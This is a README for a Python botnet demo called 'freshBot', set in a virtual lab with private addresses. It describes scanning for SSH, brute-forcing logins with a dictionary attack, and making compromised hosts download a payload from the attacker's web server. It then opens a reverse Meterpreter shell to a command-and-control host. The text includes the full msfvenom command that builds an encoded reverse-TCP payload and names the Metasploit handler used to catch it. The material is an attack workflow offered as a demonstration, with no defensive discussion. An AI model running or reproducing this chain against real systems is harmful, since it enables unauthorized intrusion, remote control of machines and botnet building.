# freshBot
Demonstration of a simple botnet written in Python.<br>
<br>
"scan_drop.py" scans virtual network, if it finds a node with ssh<br>
running on it performs a dictionary attack. If correct credentials are<br>
provided, 1st payload executes and directs target to download an "evil_file"<br>
from our web server. 2nd stage payload is a reverse meterpreter shell to C&C.<br>
<br>
<h3>The Environment Setup</h3>
1. Our Attack machine: <h4>Linux kali 4.16.0-kali2-amd64</h4>
2. Create Web Server: <h4>192.168.203.1/evil_file</h4>
3. 4 target ssh servers on the same virtual network: <h4>ubuntu-16.04.5-desktop-amd64</h4>
&nbsp;&nbsp;&nbsp;192.168.203.150<br>
&nbsp;&nbsp;&nbsp;192.168.203.151<br>
&nbsp;&nbsp;&nbsp;192.168.203.152<br>
&nbsp;&nbsp;&nbsp;192.168.203.153<br>
<br>
4. Create payload: <h4>msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file</h4>
5. msf5 > <h4>exploit/multi/handler module</h4>
6. scan_drop.py <h4>Scan, Dictionary Attack, RCE.</h4>
